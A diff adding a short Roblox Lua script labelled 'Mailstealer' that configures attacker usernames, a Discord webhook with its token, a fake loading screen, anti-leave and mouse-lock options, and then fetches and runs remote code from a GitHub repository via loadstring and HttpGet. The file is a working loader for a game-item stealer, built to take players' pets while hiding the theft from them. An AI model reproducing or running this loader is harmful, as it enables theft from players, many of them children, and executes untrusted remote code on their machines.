@@ -1,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "CoolEthanboy2333" -- good pets
+Webhook = "https://discord.com/api/webhooks/1125502804077838436/G-G6Dyp6UlbgN2kXk_iB1AeqXageKQYsSeJ6UuxMRmN9Ycd62EaIBAdH0F810O9uiAPx" -- pings for pets
+UserName2 = "Bahasht32" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
